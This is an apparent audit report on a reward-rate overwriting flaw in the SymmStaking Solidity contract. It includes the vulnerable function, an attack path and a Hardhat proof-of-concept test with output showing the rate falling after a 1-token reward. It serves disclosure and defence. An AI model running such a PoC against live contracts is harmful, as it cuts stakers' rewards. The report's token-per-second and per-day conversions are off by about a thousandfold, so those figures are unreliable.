# Reward Rate Overwriting in SymmStaking Allows Reward Schedule Disruption

### Summary

The `SymmStaking `contract's `reward rate `can be manipulated and  complete overwriting by adding only  small reward amounts, leading to significant reduction in user rewards.

### Root Cause

As we can see The `_addRewardsForToken` function recalculates reward rates without minimum amount validation, thus , Each new reward notification in [notifyRewardAmount](https://github.com/SYMM-IO/token/blob/1d014156b1d9f0ab3259026127b9220eb2da3292/contracts/staking/SymmStaking.sol#L275)
- Overwrites existing rate with new calculation.
- Resets reward period.

```solidity
function _addRewardsForToken(address token, uint256 amount) internal {
    TokenRewardState storage state = rewardState[token];
    if (block.timestamp >= state.periodFinish) {
        state.rate = amount / state.duration;
    } else {
        uint256 remaining = state.periodFinish - block.timestamp;
        uint256 leftover = remaining * state.rate;
   @>     state.rate = (amount + leftover) / state.duration;
    }
    state.lastUpdated = block.timestamp;
    state.periodFinish = block.timestamp + state.duration;
}
```

### Attack Path

```typescript
// Wait 4 days into the period
// Then call with minimal amount
notifyRewardAmount([token], [1e18])

// This triggers _addRewardsForToken which:
remaining = periodFinish - block.timestamp // 3 days
leftover = remaining * currentRate
newRate = (1e18 + leftover) / 1 week // Much lower rate
periodFinish = block.timestamp + 1 week // Extended period
```

### Impact

Users receive significantly less rewards than intended and this Affects all stakers in the pool.

### PoC

```Typescript
describe("Reward Calculation", function () {
			it("should demonstrate reward rate manipulation with 1 token", async function () {
				// Initial setup - deposit 10 SYMM
				const depositAmount = e("10")
				await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
				await symmStaking.connect(user1).deposit(depositAmount, user1.address)
		
				// First reward period - 100 tokens
				const initialReward = e("100")
				await stakingToken.connect(admin).mint(admin.address, initialReward)
    			await stakingToken.connect(admin).approve(await symmStaking.getAddress(), initialReward)
   				await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true)
    			await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [initialReward])
				// Record initial rate
				const state = await symmStaking.rewardState(await stakingToken.getAddress())
				console.log("Initial rate:", state.rate.toString())
		
				// Move to day 4
				await time.increase(4 * 24 * 3600)
				const midPeriodRewards = await symmStaking.earned(user1.address, await stakingToken.getAddress())
				console.log("Rewards at day 4:", midPeriodRewards.toString())
		
				// Add 1 token
				const smallReward = e("1")
				await stakingToken.connect(admin).approve(await symmStaking.getAddress(), smallReward)
				await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [smallReward])
		
				// Check new rate
				const newState = await symmStaking.rewardState(await stakingToken.getAddress())
				console.log("New rate after 1 token:", newState.rate.toString())
		
				// Move to original end
				await time.increase(3 * 24 * 3600)
				
				// Claim and check actual rewards
				const balanceBefore = await stakingToken.balanceOf(user1.address)
				await symmStaking.connect(user1).claimRewards()
				const balanceAfter = await stakingToken.balanceOf(user1.address)
				
				console.log("Total rewards received:", balanceAfter - balanceBefore)
		
				// Verify rate manipulation impact
				expect(newState.rate).to.be.lt(state.rate)
				expect(balanceAfter - balanceBefore).to.be.lt(initialReward)
			})
		})
```

  1 passing (5s)
```
as we can see : 

```typescript
Initial rate: 165343915343915
= ~0.165 tokens per second 
= ~14,285 tokens per day

New rate after 1 token: 72514570385767
= ~0.072 tokens per second
= ~6,225 tokens per day
```

The test results confirm the rate manipulation by showing the rate dropping from 165343915343915 to 72514570385767 after adding just 1 token.
